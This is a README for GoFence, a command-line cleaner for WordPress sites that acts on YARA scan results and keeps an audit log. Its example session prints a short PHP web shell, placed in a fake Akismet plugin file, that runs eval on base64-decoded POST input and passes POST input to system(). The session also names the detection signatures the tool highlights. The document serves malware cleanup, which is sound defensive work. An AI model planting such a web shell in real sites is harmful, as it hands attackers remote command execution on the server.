# GoFence - A CLI-Based Alternative to Wordfence

GoFence is a command-line utility that offers a powerful alternative to Wordfence. This tool is designed to provide efficient and resource-conscious solutions for safeguarding your web assets without the overhead of a graphical user interface.

## Key Motivation
Wordfence, while effective, often consumes substantial resources in shared hosting environments due to its per-site utilization. In such scenarios, GoFence steps in as a streamlined and optimized solution, allowing you to proactively secure and manage web assets without straining server resources.

## Features
* **Safe CLI Context Previews:** Safely isolates and shows the first 15 lines of a flagged payload with horizontal string truncation to keep your terminal from freezing.
* **ANSI Threat Highlighting:** Instantly highlights high-risk signatures (`eval`, `base64_decode`, etc.) in bold red to decrease analyst evaluation time.
* **Deep Inspect (`v`):** Allows developers to iteratively view the next 30 lines of a file dynamically without exiting the prompt workflow.
* **Tamper-Resistant Audit Trail:** Records all investigator decisions automatically to an append-only `audit.log` file tracking action types and targets.

## How to use it?

### 1. Install YARA (The Scanning Engine Companion)
```bash
git clone git@github.com:VirusTotal/yara.git
cd yara/
YACC=bison ./configure
make
sudo make install
```

### 2. Scan your root web directory
GoFence expects the scanning output to be exactly named `yara.log`. Use your `wordpress.yara` signature rules repository to scan the system target:
```bash
$ yara -rs ./wordpress.yara /var/www > yara.log
```

### 3. Run GoFence
Execute the compiled binary inside the directory housing your `yara.log` file to begin remediation:
```bash
/var/www$ ./gofence
```

### Interactive CLI Workflow Example:
```text
--- PREVIEW: wp-content/plugins/akismet/malware.php ---
  1 | <?php
  2 | // Fake Core Hook
  3 | $GLOBALS['auth'] = $_POST['pass'];
  4 | eval(base64_decode($_POST['payload']));
----------------------------------------
-> Action for malware.php? [y=Delete, n=Skip, v=View More]: v

--- MORE LINES: wp-content/plugins/akismet/malware.php ---
  5 | system($GLOBALS['auth']);
  6 | // Remaining payload...
----------------------------------------
-> Action for malware.php? [y=Delete, n=Skip, v=View More]: y
2026/10/01 22:30:15 [DELETED] wp-content/plugins/akismet/malware.php
```

### 4. Review Compliance Trails
All actions taken by administrators or automated developers are tracked under `audit.log` in an append-only syntax:
```text
[2026-10-01T22:30:15-04:00] ACTION=DELETED FILE=wp-content/plugins/akismet/malware.php
[2026-10-01T22:31:02-04:00] ACTION=SKIPPED FILE=wp-includes/functions.php
```

## Room for Improvement
GoFence is an evolving project with ongoing development. Future target markers on our pipeline map include:
* Automatically gathering and dropping local **system usernames** inside the audit string.
* Implementation of a temporary **quarantine folder scheme** to move files into structural stubs instead of permanent disk deletion.
* Dynamic terminal platform sniffing to turn off ANSI escape rules safely in environments lacking terminal color registers (e.g. standard Windows legacy CMD scopes).

Your contributions and feedback are welcomed as we work together to refine and expand GoFence's capabilities.
